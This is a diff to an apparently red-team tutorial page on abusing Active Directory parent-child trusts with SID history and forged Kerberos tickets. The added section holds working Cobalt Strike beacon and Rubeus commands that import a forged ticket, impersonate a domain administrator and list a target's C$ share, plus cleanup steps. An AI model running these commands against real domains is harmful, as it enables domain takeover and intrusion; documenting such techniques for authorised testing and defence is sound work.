@@ -2,7 +2,7 @@
 title: "Parent-Child Trusts · SID History and Tickets"
 description: "Enumerate an intra-forest trust, distinguish child and root SIDs, and follow the example Golden Ticket flow and the Diamond Ticket alternative."
 category: "Forest & Domain Trusts"
-tools: ["Cobalt Strike", "Rubeus", "PowerShell"]
+tools: ["Cobalt Strike", "Rubeus", "PowerShell", "Kerbeus BOF"]
 updated: "2026-11-11"
 tags: ["ad", "trusts", "forest", "kerberos", "sid-history"]
 draft: false
@@ -168,6 +168,36 @@ IMPORT AND VERIFY
 [ ] ls \\<ROOT_DC_FQDN>\c$ → verify the target resource
 [ ] kerberos_ticket_purge → only the selected test cache
 [ ] rev2self
+```
+
+## Ticket import alternatives
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
+```
+
+```shell
+# OPSEC Alternative
+beacon> make_token DUBLIN\Administrator FakePass
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
+beacon> run klist
+beacon> ls \\<TARGET_FQDN>\c$
+```
+
+```shell
+# Rubeus Alternative
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DUBLIN /username:Administrator /password:FakePass /ticket:<BASE64_TICKET>
+beacon> steal_token <CREATED_PID>
+beacon> run klist
+beacon> ls \\<TARGET_FQDN>\c$
+```
+
+```shell
+# BOF session cleanup: run while the disposable session is selected.
+beacon> krb_purge
+beacon> rev2self
+# Rubeus createnetonly path only: terminate its disposable process.
+beacon> kill <CREATED_PID>
 ```
 
 ## Related references
